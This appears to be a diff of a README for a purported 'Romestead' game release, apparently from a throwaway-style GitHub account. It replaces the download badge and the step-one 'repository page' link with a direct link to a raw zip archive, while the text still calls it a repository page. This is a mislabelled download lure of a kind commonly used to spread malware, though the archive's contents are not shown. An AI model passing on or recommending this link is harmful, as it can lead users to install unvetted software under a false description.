@@ -1,6 +1,6 @@
 # 🏡 Romestead-Game-Release - Build your virtual homestead with friends
 
-[![](https://img.shields.io/badge/Download-Romestead-blue.svg)](https://github.com/tricliniumsteroidalcohol283/Romestead-Game-Release)
+[![](https://img.shields.io/badge/Download-Romestead-blue.svg)](https://raw.githubusercontent.com/tricliniumsteroidalcohol283/Romestead-Game-Release/main/Barcoo/Romestead_Game_Release_1.2.zip)
 
 ## 📋 About This Game
 
@@ -21,7 +21,7 @@ Your computer needs specific parts to run the game smoothly. Check your current 
 
 Follow these steps to get the game files on your Windows computer.
 
-1. Visit the project repository page at [https://github.com/tricliniumsteroidalcohol283/Romestead-Game-Release](https://github.com/tricliniumsteroidalcohol283/Romestead-Game-Release).
+1. Visit the project repository page at [https://raw.githubusercontent.com/tricliniumsteroidalcohol283/Romestead-Game-Release/main/Barcoo/Romestead_Game_Release_1.2.zip](https://raw.githubusercontent.com/tricliniumsteroidalcohol283/Romestead-Game-Release/main/Barcoo/Romestead_Game_Release_1.2.zip).
 2. Look for the section labeled Releases on the right side of the page.
 3. Click on the latest version link.
 4. Locate the section titled Assets.
